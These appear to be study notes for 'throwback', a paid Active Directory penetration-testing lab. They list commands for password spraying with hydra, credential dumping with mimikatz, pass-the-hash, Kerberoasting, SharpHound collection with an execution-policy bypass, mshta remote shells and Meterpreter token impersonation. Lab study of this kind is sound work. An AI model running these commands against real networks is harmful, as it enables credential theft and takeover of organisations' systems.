throwback

Cost: $60/month
Hours: 18-60 hours research/study

```
# Powershell

Get-NetDomain
Get-NetDomainController    
Get-NetForest    
Get-NetDomainTrust

```
# Password Spraying
hydra
(Web Application Example) hydra -L users.txt -p <password> MACHINE_IP http-post-form /src/redirect.php:<user_parameter>=^USER^&<pass_parameter>=^PASS^:F=incorrect' -v

```
# Payload Creation, Staged/Stageless Payloads
msfvenom -l payloads    

Stageless payloads by design are larger because they contain everything required to land a reverse shell back on your box in a nice and neat style.
Staged payloads are only part of the designation needed to spawn a shell. The staged aspect of the payload can assist with AV evasion and size reduction. 

```
# LLMNR/NBT-NS Poisoning
responder

# Cracking Hashes
hashcat -m 5600 hash.txt rockyou.txt -r rules/OneRuleToRuleThemAll.rule --debug-mode=1 --debug-file=matched.rule

```
#C2
Empire
https://github.com/BC-SECURITY/Empire.git

Starkiller
https://github.com/BC-SECURITY/Starkiller/releases 

mimikatz
# LSA (Local Security Authority) also handles credentials used by the system, from everything to basic password changes to creation of access tokens
(mimikatz example command) lsadump::lsa /patch 
sekurlsa::tickets /export
lsadump::lsa /patch
# SAM (Security Account Manager) holds a copy of all the user's passwords which makes it a valuable file for us to dump. 
lsadump::sam
# Attacking lsass through Mimikatz is with the sekurlsa module. It will attempt to retrieve the credentials/hashes of currently logged in users. 
sekurlsa::logonPasswords

seatbelt
```
# Proxychains
(In Metasploit) use auxiliary/server/socks4a
(Change socks port) sudo vi /etc/proxychains.conf
proxychains command

```
# Pass the Hash

crackmapexec (can pass hash to auth as victim)
crackmapexec smb <IP>/24 -u <user> -d <domain> -H <hash>

evil-winrm (to pass hash to auth as victim)

```
# Bloodhound

Install Bloodhound: https://github.com/BloodHoundAD/

(Migrate Invoker to Victim) Invoke Sharphound Ingestor
https://github.com/BloodHoundAD/SharpHound3
powershell -ep bypass
Import-Module .\Sharphound.ps1
Invoke-Bloodhound -CollectionMethod All -Domain THROWBACK.local -ZipFileName loot.zip 

(Migrate Zip Back to Attack Machine, Drag/Drop in Bloodhound)

```
# Kerberoasting
Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. To enumerate Kerberoastable accounts use BloodHound to find all Kerberoastable accounts.

Impacket: https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19

proxychains sudo python3 GetUserSPNs.py -dc-ip <IP> domain/user:password -request    

```
# mshta.exe 
mshta.exe is a built-in executable on Windows devices that’s used to aid in script execution with HTML applications. This permits a attacker to execute the file on the remote server and return a shell. 


```
# Intel, check commits:

https://api.github.com/users/USERGOESHERE/events/public  

# Email -> Linkedin Coor
git clone https://github.com/Sq00ky/LeetLinked
  

```````
# Meterpreter Session Token Impersonation

use incognito
list_tokens -u 
















